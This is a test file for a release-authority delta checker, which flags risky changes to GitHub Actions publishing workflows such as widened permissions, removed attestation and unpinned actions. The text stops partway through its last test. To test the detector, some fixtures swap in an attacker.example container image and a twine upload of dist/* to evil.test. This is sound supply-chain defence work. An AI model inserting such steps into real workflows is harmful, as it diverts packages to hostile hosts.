import { describe, expect, it } from "vitest";
import {
  type AuthorityBaselineRef,
  type AuthorityChange,
  type AuthorityChangeKind,
  computeReleaseAuthorityDelta,
} from "../server/lib/release-authority/delta";
import {
  type AuthorityArtifact,
  type AuthorityUnresolved,
  type ReleaseAuthoritySnapshot,
  buildReleaseAuthoritySnapshot,
} from "../server/lib/release-authority/snapshot";
import { parseWorkflowYaml } from "../server/lib/release-authority/yaml";

const ENTRY = ".github/workflows/release.yml";

// A workflow with the shape the PyPI gate documents: build uploads a candidate,
// a gated publish job downloads it and publishes with attestations.
const BASE_WORKFLOW = `
name: Release
on:
  push:
    tags:
      - "v*"

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      - run: python -m build
      - uses: actions/upload-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
  publish:
    needs: build
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pypi-release-candidate
          path: dist/
      - uses: actions/attest-build-provenance@v2
      - uses: pypa/gh-action-pypi-publish@release/v1
`;

interface SnapshotOptions {
  workflows?: Array<{
    path: string;
    content: string;
    role?: "entry" | "referenced";
    sha?: string;
    localActionDigests?: Record<string, string>;
  }>;
  artifacts?: AuthorityArtifact[];
  unresolved?: AuthorityUnresolved[];
  /** `null` models a run GitHub reported no entry workflow path for. */
  workflowPath?: string | null;
}

function makeSnapshot(options: SnapshotOptions = {}): Promise<ReleaseAuthoritySnapshot> {
  const workflows = options.workflows ?? [{ path: ENTRY, content: BASE_WORKFLOW }];
  return buildReleaseAuthoritySnapshot({
    run: {
      repositoryFullName: "acme/widget",
      environment: "pypi",
      runId: 1234,
      runAttempt: 1,
      workflowPath: options.workflowPath === undefined ? ENTRY : options.workflowPath,
      headSha: "b".repeat(40),
      ref: "refs/tags/v1.0.0",
      event: "push",
      actor: "maintainer",
      triggeringActor: "maintainer",
    },
    workflows: workflows.map((workflow) => {
      const parsed = parseWorkflowYaml(workflow.content);
      return {
        path: workflow.path,
        repositoryFullName: "acme/widget",
        sha: workflow.sha ?? "c".repeat(40),
        ref: "refs/tags/v1.0.0",
        role: workflow.role ?? "entry",
        content: workflow.content,
        document: parsed.value,
        documentComplete: parsed.complete,
        localActionDigests: workflow.localActionDigests,
      };
    }),
    artifacts: options.artifacts ?? [
      { name: "widget-1.0.0-py3-none-any.whl", kind: "wheel", sha256: "a1" },
      { name: "widget-1.0.0.tar.gz", kind: "sdist", sha256: "a2" },
    ],
    unresolved: options.unresolved ?? [],
  });
}

const BASELINE_REF: AuthorityBaselineRef = {
  snapshotId: "snap-1",
  gateId: "gate-1",
  runId: 1000,
  headSha: "a".repeat(40),
  approvedAt: "2026-07-01T00:00:00.000Z",
};

async function deltaBetween(priorWorkflow: string, currentWorkflow: string) {
  const prior = await makeSnapshot({ workflows: [{ path: ENTRY, content: priorWorkflow }] });
  const current = await makeSnapshot({ workflows: [{ path: ENTRY, content: currentWorkflow }] });
  return computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
}

function kinds(changes: AuthorityChange[]): AuthorityChangeKind[] {
  return changes.map((change) => change.kind);
}

function find(changes: AuthorityChange[], kind: AuthorityChangeKind): AuthorityChange | undefined {
  return changes.find((change) => change.kind === kind);
}

describe("computeReleaseAuthorityDelta", () => {
  it("reports no_baseline for the first release on a boundary", async () => {
    const current = await makeSnapshot();
    const delta = computeReleaseAuthorityDelta(current, null);
    expect(delta.status).toBe("no_baseline");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.changes).toEqual([]);
    expect(delta.baseline).toBeNull();
  });

  it("reports unchanged when the authority is identical", async () => {
    const delta = await deltaBetween(BASE_WORKFLOW, BASE_WORKFLOW);
    expect(delta.status).toBe("unchanged");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.highestSignificance).toBe("none");
    expect(delta.baseline).toEqual(BASELINE_REF);
  });

  it("treats comment, ordering and formatting edits as cosmetic", async () => {
    const edited = `# Release pipeline, rewritten for clarity.
${BASE_WORKFLOW.replace("name: Release", 'name: "Release"').replace(
  "  build:",
  "  # builds the distributions\n  build:",
)}`;
    const delta = await deltaBetween(BASE_WORKFLOW, edited);
    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(delta.highestSignificance).toBe("low");
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats order-insensitive permission key reordering as cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n\njobs:",
      "permissions:\n  contents: read\n  id-token: none\n\njobs:",
    );
    const current = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n\njobs:",
      "permissions:\n  id-token: none\n  contents: read\n\njobs:",
    );

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("cosmetic");
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("does not treat a long authority value changed past its display bound as cosmetic", async () => {
    const prefix = `npm publish --tag ${"x".repeat(320)}`;
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      `      - run: ${prefix}-stable\n`,
    );
    const current = prior.replace(`${prefix}-stable`, `${prefix}-latest`);

    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(kinds(delta.changes)).toContain("workflow_authority_changed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it.each([
    {
      label: "job condition",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    if: github.ref_type == 'tag'\n    needs: build\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    if: always()\n    needs: build\n",
      ),
    },
    {
      label: "job dependency",
      prior: BASE_WORKFLOW,
      current: BASE_WORKFLOW.replace("    needs: build\n", "    needs: bootstrap\n"),
    },
    {
      label: "job runner selection",
      prior: BASE_WORKFLOW,
      current: BASE_WORKFLOW.replace(
        "    runs-on: ubuntu-latest\n    environment: pypi",
        "    runs-on: self-hosted\n    environment: pypi",
      ),
    },
    {
      label: "job container",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    container: node:22\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    container: attacker.example/build:latest\n",
      ),
    },
    {
      label: "job service",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: attacker.example/registry:latest\n",
      ),
    },
    {
      label: "job output mapping",
      prior: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    outputs:\n      registry: stable\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  build:\n    runs-on: ubuntu-latest\n",
        "  build:\n    runs-on: ubuntu-latest\n    outputs:\n      registry: attacker-controlled\n",
      ),
    },
    {
      label: "job environment mapping",
      prior: BASE_WORKFLOW.replace(
        "    environment: pypi\n",
        "    environment: pypi\n    env:\n      NPM_CONFIG_REGISTRY: https://registry.npmjs.org\n",
      ),
      current: BASE_WORKFLOW.replace(
        "    environment: pypi\n",
        "    environment: pypi\n    env:\n      NPM_CONFIG_REGISTRY: https://packages.example.test\n",
      ),
    },
    {
      label: "workflow environment mapping",
      prior: BASE_WORKFLOW.replace(
        "permissions:\n",
        "env:\n  NPM_CONFIG_REGISTRY: https://registry.npmjs.org\n\npermissions:\n",
      ),
      current: BASE_WORKFLOW.replace(
        "permissions:\n",
        "env:\n  NPM_CONFIG_REGISTRY: https://packages.example.test\n\npermissions:\n",
      ),
    },
    {
      label: "publish-step condition",
      prior: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - if: github.ref_type == 'tag'\n        uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - if: always()\n        uses: pypa/gh-action-pypi-publish@release/v1\n",
      ),
    },
    {
      label: "job strategy matrix",
      prior: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    needs: build\n    strategy:\n      matrix:\n        registry: [https://registry.npmjs.org]\n",
      ).replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: ${{ matrix.registry }}\n",
      ),
      current: BASE_WORKFLOW.replace(
        "  publish:\n    needs: build\n",
        "  publish:\n    needs: build\n    strategy:\n      matrix:\n        registry: [https://packages.example.test]\n",
      ).replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: ${{ matrix.registry }}\n",
      ),
    },
    {
      label: "non-blocking safeguard",
      prior: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - uses: actions/attest-build-provenance@v2\n        continue-on-error: false\n",
      ),
      current: BASE_WORKFLOW.replace(
        "      - uses: actions/attest-build-provenance@v2\n",
        "      - uses: actions/attest-build-provenance@v2\n        continue-on-error: true\n",
      ),
    },
  ])("does not call a changed $label cosmetic", async ({ prior, current }) => {
    const delta = await deltaBetween(prior, current);

    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      scope: ENTRY,
    });
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("keeps an execution-control change visible beside a categorized change", async () => {
    const prior = BASE_WORKFLOW.replace(
      "  publish:\n    needs: build\n",
      "  publish:\n    if: github.ref_type == 'tag'\n    needs: build\n",
    );
    const current = prior
      .replace("github.ref_type == 'tag'", "always()")
      .replace("permissions:\n  contents: read", "permissions:\n  contents: write");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "permission_widened")).toMatchObject({
      scope: ENTRY,
      subject: "contents",
    });
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      scope: ENTRY,
      subject: "conditions, dependencies, environment mappings, or execution controls",
    });
  });

  it("flags a widened permission", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n"),
    );
    expect(delta.status).toBe("changed");
    expect(delta.requiresApproval).toBe(true);
    const change = find(delta.changes, "permission_widened");
    expect(change).toMatchObject({
      significance: "high",
      scope: `${ENTRY}/publish`,
      subject: "contents",
      before: "read",
      after: "write",
    });
  });

  it("does not flag a narrowed permission as high signal", async () => {
    const widened = BASE_WORKFLOW.replace("      contents: read\n", "      contents: write\n");
    const delta = await deltaBetween(widened, BASE_WORKFLOW);
    expect(find(delta.changes, "permission_narrowed")?.significance).toBe("low");
    expect(delta.highestSignificance).toBe("low");
  });

  it("flags removing the permissions block as a widening to the repository default", async () => {
    const withJobPermissionsOnly = BASE_WORKFLOW.replace("permissions:\n  contents: read\n\n", "");
    const withoutBlock = withJobPermissionsOnly.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );
    const delta = await deltaBetween(withJobPermissionsOnly, withoutBlock);
    expect(find(delta.changes, "permission_block_removed")).toMatchObject({
      significance: "high",
      scope: `${ENTRY}/publish`,
      after: "repository default",
    });
    // The individual scopes inside a removed block are not re-reported.
    expect(kinds(delta.changes)).not.toContain("permission_removed");
  });

  it("compares a removed job block with inherited workflow permissions", async () => {
    const inherited = BASE_WORKFLOW.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );

    const delta = await deltaBetween(BASE_WORKFLOW, inherited);

    expect(find(delta.changes, "permission_removed")).toMatchObject({
      significance: "low",
      scope: `${ENTRY}/publish`,
      subject: "id-token",
      before: "write",
      after: null,
    });
    expect(kinds(delta.changes)).not.toContain("permission_block_removed");
  });

  it("treats removing a job block identical to workflow permissions as cosmetic", async () => {
    const redundant = BASE_WORKFLOW.replace(
      "permissions:\n  contents: read\n",
      "permissions:\n  id-token: write\n  contents: read\n",
    );
    const inherited = redundant.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "",
    );

    const delta = await deltaBetween(redundant, inherited);

    expect(delta.status).toBe("cosmetic");
    expect(delta.requiresApproval).toBe(false);
    expect(kinds(delta.changes)).toEqual(["workflow_content_changed"]);
  });

  it("treats an explicit permissions allowlist becoming read-all as a widening", async () => {
    const readAll = BASE_WORKFLOW.replace(
      "    permissions:\n      id-token: write\n      contents: read\n",
      "    permissions: read-all\n",
    );
    const delta = await deltaBetween(BASE_WORKFLOW, readAll);

    expect(delta.highestSignificance).toBe("high");
    expect(delta.changes).toContainEqual(
      expect.objectContaining({
        kind: "permission_widened",
        significance: "high",
        scope: `${ENTRY}/publish`,
        subject: "unlisted scopes",
        before: "none",
        after: "read",
      }),
    );
  });

  it("flags a newly added dangerous trigger above an ordinary one", async () => {
    const dispatch = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace('      - "v*"\n', '      - "v*"\n  workflow_dispatch:\n'),
    );
    expect(find(dispatch.changes, "trigger_added")).toMatchObject({
      significance: "high",
      subject: "workflow_dispatch",
    });

    const release = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace('      - "v*"\n', '      - "v*"\n  release:\n    types: [published]\n'),
    );
    expect(find(release.changes, "trigger_added")).toMatchObject({
      significance: "medium",
      subject: "release",
    });
  });

  it("flags a trigger that lost every filter as widened", async () => {
    const unfiltered = BASE_WORKFLOW.replace('  push:\n    tags:\n      - "v*"\n', "  push:\n");
    const delta = await deltaBetween(BASE_WORKFLOW, unfiltered);
    expect(find(delta.changes, "trigger_filter_widened")).toMatchObject({
      significance: "high",
      subject: "push",
      before: "tags=[v*]",
      after: "(unfiltered)",
    });
  });

  it("preserves order-sensitive positive and negative trigger patterns", async () => {
    const prior = BASE_WORKFLOW.replace(
      '    tags:\n      - "v*"\n',
      '    branches:\n      - "releases/**"\n      - "!releases/**-alpha"\n',
    );
    const current = prior.replace(
      '      - "releases/**"\n      - "!releases/**-alpha"\n',
      '      - "!releases/**-alpha"\n      - "releases/**"\n',
    );
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "push",
      before: "branches=[releases/**,!releases/**-alpha]",
      after: "branches=[!releases/**-alpha,releases/**]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags a changed workflow_run workflow selector", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      '  workflow_run:\n    workflows: ["Trusted build"]\n    types: [completed]\n',
    );
    const current = prior.replace("Trusted build", "Untrusted build");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "workflow_run",
      before: "types=[completed];workflows=[Trusted build]",
      after: "types=[completed];workflows=[Untrusted build]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags a changed release schedule", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      "  schedule:\n    - cron: '0 0 * * 1'\n",
    );
    const current = prior.replace("0 0 * * 1", "0 0 * * 2");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "schedule",
      before: "cron=[0 0 * * 1]",
      after: "cron=[0 0 * * 2]",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags changed workflow_dispatch input authority", async () => {
    const prior = BASE_WORKFLOW.replace(
      '  push:\n    tags:\n      - "v*"\n',
      "  workflow_dispatch:\n    inputs:\n      registry:\n        type: choice\n        options: [npm, internal]\n        default: npm\n",
    );
    const current = prior.replace("default: npm", "default: internal");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "trigger_filter_changed")).toMatchObject({
      subject: "workflow_dispatch",
    });
    expect(delta.requiresApproval).toBe(true);
  });

  it("flags removing the environment boundary", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("    environment: pypi\n", ""),
    );
    expect(find(delta.changes, "environment_removed")).toMatchObject({
      significance: "high",
      before: "pypi",
      after: null,
    });
  });

  it("flags a changed environment name", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("    environment: pypi\n", "    environment: pypi-fast\n"),
    );
    expect(find(delta.changes, "environment_changed")).toMatchObject({
      significance: "high",
      before: "pypi",
      after: "pypi-fast",
    });
  });

  it("flags a removed attestation safeguard", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("      - uses: actions/attest-build-provenance@v2\n", ""),
    );
    expect(find(delta.changes, "safeguard_removed")).toMatchObject({
      significance: "high",
      subject: "attestation",
      before: "actions/attest-build-provenance@v2",
    });
  });

  it("flags a swapped publish path", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace(
        "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        "      - run: twine upload --repository-url https://evil.test/ dist/*\n",
      ),
    );
    expect(find(delta.changes, "publish_step_added")).toMatchObject({
      significance: "high",
      subject: "publish command",
    });
    expect(find(delta.changes, "publish_step_removed")).toMatchObject({
      significance: "medium",
      subject: "publish action",
    });
  });

  it.each([
    {
      label: "python module twine",
      prior: "python -m twine upload --repository-url https://upload.pypi.org/legacy/ dist/*",
      current: "python -m twine upload --repository-url https://packages.example.test/ dist/*",
    },
    {
      label: "npm workspace",
      prior: "npm --workspace packages/public publish",
      current: "npm --workspace packages/internal publish",
    },
    {
      label: "pnpm filter",
      prior: "pnpm --filter @acme/public publish",
      current: "pnpm --filter @acme/internal publish",
    },
    {
      label: "npx VS Code publisher",
      prior: "npx vsce publish --pre-release",
      current: "npx vsce publish --target linux-x64",
    },
  ])("captures changed $label publish commands", async ({ prior, current }) => {
    const priorWorkflow = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1",
      `      - run: ${prior}`,
    );
    const currentWorkflow = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1",
      `      - run: ${current}`,
    );

    const delta = await deltaBetween(priorWorkflow, currentWorkflow);

    expect(delta.status).toBe("changed");
    expect(kinds(delta.changes)).toContain("publish_step_added");
    expect(kinds(delta.changes)).toContain("publish_step_removed");
    expect(kinds(delta.changes)).not.toContain("workflow_content_changed");
  });

  it("flags changed publish-action inputs instead of calling the edit cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n",
      "      - uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://upload.pypi.org/legacy/\n",
    );
    const current = prior.replace(
      "https://upload.pypi.org/legacy/",
      "https://packages.example.test/",
    );
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "pypa/gh-action-pypi-publish",
    });
    expect(delta.status).toBe("changed");
  });

  it("flags changed safeguard inputs instead of calling the edit cosmetic", async () => {
    const prior = BASE_WORKFLOW.replace(
      "      - uses: actions/attest-build-provenance@v2\n",
      "      - uses: actions/attest-build-provenance@v2\n        with:\n          subject-path: dist/**\n",
    );
    const current = prior.replace("subject-path: dist/**", "subject-path: unrelated/**");
    const delta = await deltaBetween(prior, current);

    expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
      significance: "high",
      subject: "actions/attest-build-provenance",
    });
    expect(delta.status).toBe("changed");
  });

  it("flags an action reference that stopped being pinned", async () => {
    const unpinned = BASE_WORKFLOW.replace(
      "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "actions/checkout@main",
    );
    const delta = await deltaBetween(BASE_WORKFLOW, unpinned);
    expect(find(delta.changes, "action_unpinned")).toMatchObject({
      significance: "high",
      subject: "actions/checkout",
      after: "main",
    });
  });

  it("reports an always-mutable reference as standing, not as a change", async () => {
    const delta = await deltaBetween(BASE_WORKFLOW, BASE_WORKFLOW);
    expect(delta.status).toBe("unchanged");
    expect(delta.changes).toEqual([]);
    // `actions/upload-artifact@v4` and friends were mutable in both releases.
    expect(delta.standing.mutableRefs).toContain("actions/upload-artifact@v4");
    expect(delta.standing.mutableRefs).not.toContain(
      "actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    );
  });

  it("flags a moved tag on a mutable reference as a ref change", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
    );
    expect(find(delta.changes, "action_ref_changed")).toMatchObject({
      significance: "medium",
      subject: "actions/upload-artifact",
      before: "v4",
      after: "v3",
    });
  });

  it("falls back to a generic authority change when no category explains it", async () => {
    // The category comparisons key by (workflow, job, identity), so a job that
    // uses the *same* action twice collapses to one entry and a change in the
    // second occurrence is not attributable to a category. The authority digest
    // still moves, and the safety net turns that into a reported change rather
    // than letting the release read as unchanged.
    const twice = BASE_WORKFLOW.replace(
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n" +
        "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
    );
    const moved = twice.replace(
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - uses: actions/checkout@main\n",
    );

    const delta = await deltaBetween(twice, moved);
    expect(delta.status).toBe("changed");
    expect(find(delta.changes, "workflow_authority_changed")).toMatchObject({
      significance: "medium",
      scope: ENTRY,
    });
  });

  it("flags a changed artifact producer/consumer path", async () => {
    const delta = await deltaBetween(
      BASE_WORKFLOW,
      BASE_WORKFLOW.replace(
        "          name: pypi-release-candidate\n          path: dist/\n  publish:",
        "          name: pypi-release-candidate\n          path: out/\n  publish:",
      ),
    );
    expect(find(delta.changes, "artifact_flow_changed")).toMatchObject({
      significance: "medium",
      before: "dist/",
      after: "out/",
    });
  });

  // A baseline is looked up *by* release path, so a delta against one can never
  // see the path move. The reachable case is the opposite: no baseline for this
  // path, but the target has approved history on others.
  describe("release path", () => {
    it("flags a release path with no approved history on a target that has some", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/release.yml"],
      });
      expect(delta.status).toBe("changed");
      expect(delta.requiresApproval).toBe(true);
      expect(delta.baseline).toBeNull();
      expect(find(delta.changes, "release_path_changed")).toMatchObject({
        significance: "high",
        before: ".github/workflows/release.yml",
        after: ".github/workflows/publish.yml",
      });
    });

    it("names every approved path, summarizing past the display cap", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const paths = Array.from({ length: 10 }, (_, i) => `.github/workflows/r${i}.yml`);
      const delta = computeReleaseAuthorityDelta(current, null, { approvedReleasePaths: paths });
      const change = find(delta.changes, "release_path_changed");
      expect(change?.before).toContain(".github/workflows/r0.yml");
      expect(change?.before).toContain("+2 more");
    });

    it("stays neutral when the target has no approved history at all", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, { approvedReleasePaths: [] });
      expect(delta.status).toBe("no_baseline");
      expect(delta.requiresApproval).toBe(false);
    });

    it("ignores the release's own path in the approved set", async () => {
      const current = await makeSnapshot({ workflowPath: ".github/workflows/publish.yml" });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/publish.yml"],
      });
      expect(delta.status).toBe("no_baseline");
    });

    it("does not overclaim when the entry path could not be read", async () => {
      const current = await makeSnapshot({ workflowPath: null });
      const delta = computeReleaseAuthorityDelta(current, null, {
        approvedReleasePaths: [".github/workflows/release.yml"],
      });
      expect(delta.status).toBe("no_baseline");
      expect(delta.requiresApproval).toBe(false);
    });
  });

  describe("reusable workflows", () => {
    const CALLER = `
on:
  push:
    tags:
      - "v*"
jobs:
  publish:
    uses: acme/shared/.github/workflows/publish.yml@dddddddddddddddddddddddddddddddddddddddd
    secrets: inherit
`;
    const REUSED = `
on:
  workflow_call:
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi
    permissions:
      id-token: write
    steps:
      - uses: pypa/gh-action-pypi-publish@release/v1
`;
    const REUSED_PATH = "acme/shared/.github/workflows/publish.yml";

    const graph = (caller: string, reused: string) => [
      { path: ENTRY, content: caller, role: "entry" as const },
      { path: REUSED_PATH, content: reused, role: "referenced" as const },
    ];

    it("detects a change inside the reusable workflow, not just the caller", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({
        workflows: graph(
          CALLER,
          REUSED.replace(
            "      id-token: write\n",
            "      id-token: write\n      contents: write\n",
          ),
        ),
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "permission_added")).toMatchObject({
        significance: "high",
        scope: `${REUSED_PATH}/publish`,
        subject: "contents",
      });
    });

    it("detects a repointed reusable-workflow reference", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({
        workflows: graph(CALLER.replace("@" + "d".repeat(40), "@main"), REUSED),
      });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "action_unpinned")).toMatchObject({
        significance: "high",
        subject: "acme/shared/.github/workflows/publish.yml",
      });
    });

    it("flags newly inherited secrets on a reusable call", async () => {
      const prior = await makeSnapshot({
        workflows: graph(CALLER.replace("    secrets: inherit\n", ""), REUSED),
      });
      const current = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "secrets_inherit_added")).toMatchObject({ significance: "high" });
    });

    it("flags changed explicit inputs and secrets on a reusable call", async () => {
      const explicit = CALLER.replace(
        "    secrets: inherit\n",
        "    with:\n      target: production\n    secrets:\n      token: ${{ secrets.PYPI_TOKEN }}\n",
      );
      const prior = await makeSnapshot({ workflows: graph(explicit, REUSED) });
      const changedInput = await makeSnapshot({
        workflows: graph(explicit.replace("target: production", "target: staging"), REUSED),
      });
      const changedSecret = await makeSnapshot({
        workflows: graph(
          explicit.replace("secrets.PYPI_TOKEN", "secrets.PYPI_ADMIN_TOKEN"),
          REUSED,
        ),
      });

      for (const current of [changedInput, changedSecret]) {
        const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
        expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
          significance: "high",
          subject: "acme/shared/.github/workflows/publish.yml",
        });
      }
    });

    it("flags a reusable workflow dropping out of the graph", async () => {
      const prior = await makeSnapshot({ workflows: graph(CALLER, REUSED) });
      const current = await makeSnapshot({ workflows: [{ path: ENTRY, content: CALLER }] });
      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });
      expect(find(delta.changes, "workflow_removed")).toMatchObject({
        significance: "medium",
        subject: "reusable workflow",
      });
    });
  });

  describe("local actions", () => {
    const workflow = `
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: ./actions/publish
`;

    it("flags a changed local-action directory with unchanged workflow YAML", async () => {
      const prior = await makeSnapshot({
        workflows: [
          { path: ENTRY, content: workflow, localActionDigests: { "./actions/publish": "a" } },
        ],
      });
      const current = await makeSnapshot({
        workflows: [
          { path: ENTRY, content: workflow, localActionDigests: { "./actions/publish": "b" } },
        ],
      });

      const delta = computeReleaseAuthorityDelta(current, { snapshot: prior, ref: BASELINE_REF });

      expect(find(delta.changes, "action_configuration_changed")).toMatchObject({
        significance: "high",
        subject: "./actions/publish",
      });
      expect(delta.status).toBe("changed");
    });
  });

  it("keeps every bounded authority change reviewable past the former display cap", async () => {
    const steps = (ref: string) =>
      Array.from({ length: 120 }, (_, index) => `      - uses: acme/action-${index}@${ref}`).join(
        "\n",
      );
    const prior = `on: push\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n${steps("a".repeat(40))}\n`;
    const current = `on: push\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n${steps("b".repeat(40))}\n`;

    const delta = await deltaBetween(prior, current);

    expect(delta.changeCount).toBe(120);
    expect(delta.changes).toHaveLength(120);
    expect(new Set(delta.changes.map((change) => change.subject)).size).toBe(120);
  });

  describe("artifact continuity", () => {
    it("compares the shape of the artifact set, not per-release digests", async () => {
      const prior = await makeSnapshot({
        artifacts: [
          { name: "widget-1.0.0-py3-none-any.whl", kind: "wheel", sha256: "old1" },
